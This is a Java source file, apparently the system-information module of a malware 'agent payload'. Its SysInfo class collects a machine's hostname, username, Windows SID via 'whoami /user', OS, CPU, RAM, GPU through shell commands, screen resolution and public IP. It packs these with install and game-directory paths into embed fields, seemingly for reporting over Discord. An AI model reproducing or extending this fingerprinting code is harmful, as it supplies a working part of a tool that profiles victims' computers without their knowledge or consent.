package com.spcagentpayloa.jvmxx;

import java.awt.GraphicsEnvironment;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.nio.file.Path;
import java.util.List;
import java.util.concurrent.TimeUnit;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public final class SysInfo {
	private SysInfo() {
	}

	public static String hostname() {
		try {
			return java.net.InetAddress.getLocalHost().getHostName();
		} catch (Throwable throwable) {
			String name = System.getenv("COMPUTERNAME");
			return name == null ? "unknown" : name;
		}
	}

	public static String user() {
		return System.getProperty("user.name", "unknown");
	}

	public static String sid() {
		try {
			Process process = new ProcessBuilder("whoami", "/user").redirectErrorStream(true).start();
			String output = new String(process.getInputStream().readAllBytes(), StandardCharsets.UTF_8);
			process.waitFor(3L, TimeUnit.SECONDS);
			Matcher matcher = Pattern.compile("(S-1-[0-9-]+)").matcher(output);
			if (matcher.find()) {
				return matcher.group(1);
			}
		} catch (Throwable throwable) {
			Log.debug("SID lookup failed", throwable);
		}
		return "";
	}

	public static String os() {
		return System.getProperty("os.name", "unknown") + " " + System.getProperty("os.version", "");
	}

	public static String cpu() {
		return System.getProperty("os.arch", "unknown") + " / " + Runtime.getRuntime().availableProcessors() + " cores";
	}

	public static String ram() {
		long total = Runtime.getRuntime().maxMemory();
		try {
			java.lang.management.OperatingSystemMXBean bean = java.lang.management.ManagementFactory.getOperatingSystemMXBean();
			if (bean instanceof com.sun.management.OperatingSystemMXBean system) {
				total = system.getTotalMemorySize();
			}
		} catch (Throwable throwable) {
			Log.debug("RAM read failed", throwable);
		}
		return (total / (1024L * 1024L)) + " MB";
	}

	public static String gpu() {
		try {
			ProcessBuilder builder;
			if (AgentPaths.isWindows()) {
				builder = new ProcessBuilder("powershell", "-NoProfile", "-NonInteractive", "-Command",
					"Get-CimInstance Win32_VideoController | Select-Object -ExpandProperty Name");
			} else if (AgentPaths.isMac()) {
				builder = new ProcessBuilder("sh", "-c", "system_profiler SPDisplaysDataType | grep Chipset");
			} else {
				builder = new ProcessBuilder("sh", "-c", "lspci 2>/dev/null | grep -i vga");
			}
			builder.redirectErrorStream(true);
			Process process = builder.start();
			if (!process.waitFor(5L, TimeUnit.SECONDS)) {
				process.destroyForcibly();
				return "unknown";
			}
			try (InputStream input = process.getInputStream()) {
				ByteArrayOutputStream output = new ByteArrayOutputStream();
				input.transferTo(output);
				String text = output.toString(StandardCharsets.UTF_8).replace("Name", "").trim();
				return text.isEmpty() ? "unknown" : text.replaceAll("\\s+", " ").trim();
			}
		} catch (Throwable throwable) {
			Log.debug("GPU read failed", throwable);
			return "unknown";
		}
	}

	public static String resolution() {
		try {
			if (GraphicsEnvironment.isHeadless()) {
				return "headless";
			}
			java.awt.Dimension size = java.awt.Toolkit.getDefaultToolkit().getScreenSize();
			return size.width + "x" + size.height;
		} catch (Throwable throwable) {
			return "unknown";
		}
	}

	public static String java() {
		return System.getProperty("java.version", "unknown");
	}

	public static String publicIp() {
		try {
			HttpURLConnection connection = (HttpURLConnection) new URL("https://api.ipify.org").openConnection();
			connection.setConnectTimeout(5000);
			connection.setReadTimeout(5000);
			connection.setRequestProperty("User-Agent", DiscordConfig.USER_AGENT);
			if (connection.getResponseCode() != 200) {
				return "unknown";
			}
			try (InputStream input = connection.getInputStream()) {
				return new String(input.readAllBytes(), StandardCharsets.UTF_8).trim();
			}
		} catch (Throwable throwable) {
			return "unknown";
		}
	}

	public static String installation(Path dir, Path gameDir) {
		return dir + (gameDir == null ? "" : " | " + gameDir);
	}

	public static List<String> embedFields(Path dir, Path gameDir) {
		return List.of(
			"Hostname: " + hostname(),
			"User: " + user(),
			"OS: " + os(),
			"CPU: " + cpu(),
			"RAM: " + ram(),
			"GPU: " + gpu(),
			"Resolution: " + resolution(),
			"Java: " + java(),
			"Agent: " + Version.current(),
			"Public IP: " + publicIp(),
			"Path: " + installation(dir, gameDir)
		);
	}
}
